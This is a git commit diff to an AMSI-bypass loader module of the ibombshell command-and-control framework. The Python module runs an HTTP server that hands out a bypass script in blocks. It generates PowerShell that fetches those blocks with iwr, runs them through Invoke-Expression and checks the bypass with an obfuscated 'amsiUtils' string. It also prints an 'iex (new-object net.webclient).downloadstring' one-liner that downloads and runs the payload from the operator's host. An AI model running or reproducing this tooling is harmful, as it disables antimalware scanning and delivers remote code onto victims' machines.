3a035482af2254ca9955b8bee55b2e7ac5bd6659
pilarclares <pilar.clarescervantes.practicas@telefonica.com>
2024-08-06 13:27:33 +0200

    Amsi-loader: charge number

--- ibombshell c2/modules/bypass/amsi/amsi-loader-numlines.py
+++ ibombshell c2/modules/bypass/amsi/amsi-loader-numlines.py
@@ -3,35 +3,41 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 from threading import Thread
 from termcolor import colored, cprint
 from printib import print_ok, print_info, print_error
-from urllib.parse import parse_qs, unquote
+from urllib.parse import parse_qs, unquote, urlparse
 from module import Module
 
-SCRIPT_BLOCKS = []
+FUNCTION = ''
+BYPASS_BLOCKS = []
 LAST_INDEX = 0
 FILE_SENDED = False
 FILE_SENDED_ERROR = False
 
-class SendFile(BaseHTTPRequestHandler): 
-    # To avoid logs in our screen
+class SendFile(BaseHTTPRequestHandler):
+    # Para evitar logs en la pantalla
     def log_message(self, format, *args):
         return
-        
-    def _set_response(self): 
-        self.send_response(200) 
-        self.send_header('Content-type', 'text/html') 
-        self.end_headers() 
 
-    def do_GET(self): 
-        global SCRIPT_BLOCKS, LAST_INDEX
-        command = ''
-        if LAST_INDEX < len(SCRIPT_BLOCKS):
-            command = SCRIPT_BLOCKS[LAST_INDEX]
-            
-        response = command.encode('utf-8')
-        print_info(response)
-        
+    def _set_response(self, code=200):
+        self.send_response(code)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+
+    def do_GET(self):
+        global FUNCTION, BYPASS_BLOCKS, LAST_INDEX
+
+        parsed_path = urlparse(self.path)
+        path = parsed_path.path
+
+        if path == '/':
+            response = FUNCTION.encode('utf-8')
+        elif path == '/block':
+            command = BYPASS_BLOCKS[LAST_INDEX] if LAST_INDEX < len(BYPASS_BLOCKS) else ''
+            response = command.encode('utf-8')
+        else:
+            response = b'Not Found'
+
         self._set_response()
-        self.wfile.write(response) # response is encoded
+        self.wfile.write(response)
 
     def do_POST(self):
         global FILE_SENDED, FILE_SENDED_ERROR, LAST_INDEX
@@ -40,75 +46,71 @@ class SendFile(BaseHTTPRequestHandler):
         post_data = self.rfile.read(content_length)
         self._set_response()
 
-        self.wfile.write(''.encode('utf-8'))
+        self.wfile.write(b'')
 
         try:
             post_data = post_data.decode()
             fields = parse_qs(post_data)
-            results = fields['results'][0]
-
-            recv = str(unquote(results))
+            results = fields.get('results', [''])[0]
+            recv = unquote(results)
 
             if recv == 'Received':
-                if LAST_INDEX >= len(SCRIPT_BLOCKS):
-                    FILE_SENDED = True
-                else:
-                    LAST_INDEX += 1
+                LAST_INDEX += 1
             elif recv == 'Error':
                 FILE_SENDED_ERROR = True
+            else:
+                print_info(recv)
+                FILE_SENDED = True
 
-        except:
-            print_error("Error reading results at file upload.")
+        except Exception as e:
+            print_error(f"Error reading results at file upload: {e}")
             FILE_SENDED_ERROR = True
 
-    def do_HEAD(self): 
-        self._set_response() 
+    def do_HEAD(self):
+        self._set_response()
 
 class CustomModule(Module):
     def __init__(self):
-        information = {"Name": "amsi-loader",
-                       "Description": "AMSI bypass script loader",
-                       "Author": "@pilarclares"
-                       }
+        information = {
+            "Name": "amsi-loader",
+            "Description": "AMSI bypass script loader",
+            "Author": "@pilarclares"
+        }
 
-        # -----------name-----default_value--description--required?
-        options = {"warrior": [None, "Warrior in war", True],
-                   "ip": ["192.168.56.5", "Local IP (Where the file is located)", True],
-                   "port": ["8082", "Listener port", True],
-                   "destination": [None, "Directory with the files", True],
-                   "filePath": ["/home/kali/rm.ps1", "Path to the bypass file", True],
-                   "metadataPath": ["/home/kali/linesnumber.txt", "Path to the file containing line numbers for blocks", True]}
+        options = {
+            "warrior": [None, "Warrior in war. If none is specified, it will provide a command to download a script with AMSI bypass functionality.", False],
+            "ip": ["192.168.56.5", "Local IP (Where the file is located)", True],
+            "port": ["8082", "Listener port", True],
+            "destination": [None, "Directory with the files", True],
+            "filePath": ["/home/kali/rm.ps1", "Path to the bypass file", True],
+            "lineNumbers": ["/home/kali/linesnumber.txt", "Path to the file containing line numbers for blocks", True]
+        }
 
-        # Constructor of the parent class
         super(CustomModule, self).__init__(information, options)
-
-    # This module must be always implemented, it is called by the run option
+    
     def run_module(self):
-        global FILE_SENDED, FILE_SENDED_ERROR, SCRIPT_BLOCKS, LAST_INDEX
+        global FILE_SENDED, FILE_SENDED_ERROR, BYPASS_BLOCKS, LAST_INDEX, FUNCTION
 
         function = """
         function chargeFiles {
-    param (
-        [Parameter(Mandatory)]
-        [string] $sourceUri,
-        [Parameter(Mandatory)]
-        [string] $destination
-    )
-    
-    try
-    {
-        $req = iwr -UseBasicParsing -uri $sourceUri -Method GET
-	    Set-Content -Path $destination -Value $req.Content -Encoding utf8
-
-        $req = iwr -UseBasicParsing -uri $sourceUri -Method POST -Body @{results='Received'}
-    }
-    catch
-    {
-        $req = iwr -UseBasicParsing -uri $sourceUri -Method POST -Body @{results='Error'}
-        Write-Host "Error executing commands from the file $filePath."
-        throw $_.Exception
-    }
-}
+            param (
+                [Parameter(Mandatory)]
+                [string] $sourceUri,
+                [Parameter(Mandatory)]
+                [string] $destination
+            )
+            
+            try {
+                $req = iwr -UseBasicParsing -uri $sourceUri -Method GET
+                Set-Content -Path $destination -Value $req.Content -Encoding utf8
+                $req = iwr -UseBasicParsing -uri $sourceUri -Method POST -Body @{results='Received'}
+            }
+            catch {
+                $req = iwr -UseBasicParsing -uri $sourceUri -Method POST -Body @{results='Error'}
+                Write-Host "Error executing commands from the file $filePath."
+                throw $_.Exception
+            }
+        }
 
         function loader {
             param (
@@ -133,7 +135,7 @@ class CustomModule(Module):
                     return "The file $filePath does not exist."
                 }
 
-                try{
+                try {
                     $content = Get-Content -Path $filePath -Raw
                     Invoke-Expression $content -ErrorAction Stop | Out-Null
                 } catch {
@@ -144,11 +146,8 @@ class CustomModule(Module):
 
             try {
                 $command = 'am' + 's' + 'I' + 'u' + 'TI' + 'l' + 's'
-
                 Invoke-Expression $command -ErrorAction Stop | Out-Null
-
                 return "Success: AMSI bypassed successfully."
-
             } catch {
                 if ($_.Exception.Message -like '*malintencionados*' -or $_.Exception.Message -like '*malicious*') {
                     return "Error: AMSI is still active."
@@ -158,66 +157,79 @@ class CustomModule(Module):
             }
         }
         """
-        file = open(self.args["filePath"], 'r')
-        lines = file.readlines()
-        firstLine = 0
-
-        sourceUri = "http://{}:{}/".format(self.args["ip"], self.args["port"])
-
+        
+        with open(self.args["filePath"], 'r') as file:
+            lines = file.readlines()
+        
+        sourceUri = f"http://{self.args['ip']}:{self.args['port']}/"
         destination = self.args["destination"]
 
-        index = 0
-        function += f"$directoryPath = '{destination}'"
+        function += f"$directoryPath = '{destination}'; $sourceUri = '{sourceUri}'\n"
         function += """
         if (Test-Path -Path $directoryPath) {
             Remove-Item -Path $directoryPath -Recurse -Force
         }
-
         New-Item -Path $directoryPath -ItemType Directory | Out-Null
         """
-
-        with open(self.args["metadataPath"], 'r') as metadata:
-            for lineNumber in metadata:
+        
+        auxLine = 0
+        with open(self.args["lineNumbers"], 'r') as metadata:
+            for index, lineNumber in enumerate(metadata, start=0):
                 lineNumber = lineNumber.strip()
-                lineNumber = int(lineNumber)
+                try:
+                    lineNumber = int(lineNumber)
+                except ValueError:
+                    print_error(f"Invalid line number '{lineNumber}' in {self.args['lineNumbers']}.")
+                    return
+                
                 if len(lines) < lineNumber:
                     print_error(f"The file {self.args['filePath']} does not have {lineNumber} lines.")
                     return
-                
-                command = ''.join(lines[firstLine:lineNumber])
-                firstLine = lineNumber
-                SCRIPT_BLOCKS.append(command)
-                function += f'chargeFiles -sourceUri { sourceUri } -destination {destination}\\part{index} \n'
-                index += 1
-                
-            function += f'loader -directory { destination }'
 
-            listener = Thread(target=self.run, name='amsi-loader listener', kwargs={'address':self.args["ip"], 'port':int(self.args["port"])})
-            print_info("Sending file... waiting answer from warrior")
-            listener.start()
-            
+                command = ''.join(lines[auxLine:lineNumber])
+                BYPASS_BLOCKS.append(command)
+                function += f'chargeFiles -sourceUri {sourceUri}block -destination {destination}\\part{index}\n'
+                auxLine = lineNumber
+                
+        if auxLine < len(lines):
+            command = ''.join(lines[auxLine:])
+            BYPASS_BLOCKS.append(command)
+            function += f'chargeFiles -sourceUri {sourceUri}block -destination {destination}\\part{index}\n'
+                
+        function += f"$result = loader -directory {destination}\n"
+        function += "$req = iwr -UseBasicParsing -Uri $sourceUri -Method POST -Body @{results=$result}\n"
+        function += f"Remove-Item -Path {destination} -Recurse -Force\n"
+
+        listener = Thread(target=self.run, name='amsi-loader listener', kwargs={'address': self.args["ip"], 'port': int(self.args["port"])})
+        print_info("Sending file... waiting for an answer from the warrior")
+        listener.start()
+
+        if self.args["warrior"]:
             super(CustomModule, self).run(function)
+        else:
+            FUNCTION = function
+            print_ok(f"Everything is ready. To bypass AMSI execute this command:\niex (new-object net.webclient).downloadstring('{sourceUri}')")
 
-            while not FILE_SENDED and not FILE_SENDED_ERROR:
-                pass
+        while not FILE_SENDED and not FILE_SENDED_ERROR:
+            pass
 
-            if FILE_SENDED_ERROR:
-                print_error('An error ocurried sending the script.')
+        if FILE_SENDED_ERROR:
+            print_error('An error occurred while sending the script.')
 
-            FILE_SENDED = False
-            FILE_SENDED_ERROR = False
-            SCRIPT_BLOCKS = []
-            LAST_INDEX = 0
-
+        FILE_SENDED = False
+        FILE_SENDED_ERROR = False
+        BYPASS_BLOCKS = []
+        LAST_INDEX = 0
 
     def run(self, server_class=HTTPServer, handler_class=SendFile, address=None, port=9999):
-        try: 
+        try:
             server_address = (address, port)
             httpd = server_class(server_address, handler_class)
             try:
                 httpd.serve_forever()
             except KeyboardInterrupt:
                 pass
-            httpd.server_close()
-        except:
-            pass
+            finally:
+                httpd.server_close()
+        except Exception as e:
+            print_error(f"Server error: {e}")
